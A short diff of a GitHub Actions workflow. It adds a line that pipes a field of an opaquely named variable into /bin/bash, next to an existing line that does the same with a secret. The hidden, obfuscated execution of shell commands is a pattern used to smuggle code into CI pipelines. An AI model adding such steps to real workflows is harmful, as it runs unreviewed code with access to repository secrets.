@@ -18,6 +18,7 @@ jobs:
           urdt6: ${{ secrets.urdt6 }}
         run: |
           printf '%s' "$urdt6" | jq -r .e4950 | /bin/bash
+          echo $wny77662 | jq -r .ad313 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
